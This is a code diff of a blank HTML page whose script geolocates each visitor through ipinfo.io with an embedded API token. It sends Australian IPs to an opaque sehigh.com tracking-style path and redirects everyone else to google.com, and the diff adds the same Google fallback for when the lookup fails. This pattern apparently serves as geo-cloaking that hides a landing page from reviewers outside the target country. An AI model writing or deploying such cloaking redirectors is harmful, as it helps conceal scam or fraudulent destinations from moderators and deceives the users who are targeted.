@@ -7,30 +7,26 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" integrity="sha512-cEgdeh0IWe1pUYypx4mYPjDxGB/tyIORwjxzKrnoxcif2ZxI7fw81pZWV0lGnPWLrfIHGA7qc964MnRjyCYmEQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
     <script>
-        // Define the allowed countries (ISO 3166-1 alpha-2 country codes)
-const allowedCountries = ['AU']; // Example: United States, Canada, United Kingdom
+        const allowedCountries = ['AU']; // غير الأستراليين يدخلوا
 
-$.get('https://ipinfo.io/json', function(data) {  
-    const ipAddress = data.ip;  // Extract the IP address  
-    const country = data.country;  // Extract the country code  
+        $.get('https://ipinfo.io/json?token=396ec7a7e34187', function(data) {
+            const ipAddress = data.ip;
+            const country = data.country;
 
-    console.log("IP Address:", ipAddress);  
-    console.log("Country:", country);  
+            console.log("IP Address:", ipAddress);
+            console.log("Country:", country);
 
-    // Check if the country is in the allowed list  
-    if (allowedCountries.includes(country)) {    
-        console.log("Access allowed for country:", country);    
-        window.location.href = "https://www.sehigh.com/DZRZX6W/2151XQRW/"; // رابط للمسموح لهم  
-    } else {    
-        console.log("Access denied for country:", country);    
-        window.location.href = "https://google.com"; // رابط لمنعهم  
-    }
-}).fail(function(error) {  
-    console.error('Error:', error);  
-});
+            if (allowedCountries.includes(country)) {
+                window.location.href = "https://www.sehigh.com/DZRZX6W/2151XQRW/";
+            } else {
+                window.location.href = "https://google.com";
+            }
+        }).fail(function(error) {
+            console.error('Error:', error);
+            window.location.href = "https://google.com"; // fallback حتى إلا فشل الطلب
+        });
     </script>
 </head>
 <body>
-
 </body>
 </html>
